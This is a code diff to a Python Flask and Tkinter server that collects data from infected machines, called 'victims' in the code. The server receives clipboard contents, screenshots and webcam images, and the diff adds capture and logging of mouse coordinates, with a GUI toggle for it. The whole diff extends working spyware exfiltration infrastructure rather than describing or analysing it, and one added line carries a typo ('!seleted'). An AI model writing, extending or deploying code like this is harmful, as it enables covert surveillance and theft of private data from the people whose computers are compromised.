@@ -34,11 +34,13 @@ clipboard_file_path = 'saved_clipboard.txt'
 screenshots_dir = 'screenshots'
 camera_images_dir = 'camera_images'
 connected_ips_file_path = 'connected_ips.txt'
+mouse_file_path = 'saved_mouse_captures.txt'
 os.makedirs(screenshots_dir, exist_ok=True)
 os.makedirs(camera_images_dir, exist_ok=True)
 show_clipboard_in_logs = True
 show_screenshot_logs = True
 show_camera_logs = True
+show_mouse_coordinate_in_logs = True
 connected_ips = set()
 data_received = 0
 
@@ -74,6 +76,7 @@ def handle_post():
         clipboard_data = data.get('clipboardData', '')
         screenshot_base64 = data.get('screenshot', '')
         camera_image_base64 = data.get('cameraImage', '')
+        mouse_data = data.get('mousePosition', '')
         victim_ip = request.remote_addr
         if victim_ip not in connected_ips:
             logger.info(f"{victim_ip} connected")
@@ -93,6 +96,10 @@ def handle_post():
             save_camera_image(camera_image_base64, victim_ip)
             if show_camera_logs:
                 logger.info(f"Camera image saved from {victim_ip}")
+        if mouse_data:
+            save_to_file(mouse_file_path, f"{victim_ip}: {mouse_data}")
+            if show_mouse_coordinate_in_logs:
+                logger.info(f"Mouse coordinate from {victim_ip}: {mouse_data}")
         data_received += len(post_data)
         return jsonify({'status': 'success', 'message': 'Data received and saved successfully'}), 200
     except json.JSONDecodeError as e:
@@ -186,6 +193,9 @@ class ServerGUI:
         self.camera_check = ttk.Checkbutton(self.control_frame, text="Show Camera Logs", command=self.toggle_camera_logging)
         self.camera_check.pack(pady=10)
         self.camera_check.state(['selected'] if show_camera_logs else ['!selected'])
+        self.mouse_check = ttk.Checkbutton(self.control_frame, text="Show Mouse Coordinate Logs", command=self.toggle_mouse_logging)
+        self.mouse_check.pack(pady=10)
+        self.mouse_check.state(['selected'] if show_mouse_coordinate_in_logs else ['!seleted'])
         ttk.Label(self.control_frame, text="Theme:").pack(pady=5)
         self.theme_combo = ttk.Combobox(self.control_frame, values=["Light", "Dark"], state="readonly")
         self.theme_combo.current(1)
@@ -253,6 +263,12 @@ class ServerGUI:
         show_camera_logs = not show_camera_logs
         status = "enabled" if show_camera_logs else "disabled"
         self.log(f"Camera logging {status}.")
+
+    def toggle_mouse_logging(self):
+        global show_mouse_coordinate_in_logs
+        show_mouse_coordinate_in_logs = not show_mouse_coordinate_in_logs
+        status = "enabled" if show_mouse_coordinate_in_logs else "disabled"
+        self.log(f"Mouse Coordinate logging {status}.")
 
     def change_theme(self, event=None):
         selected_theme = self.theme_combo.get()
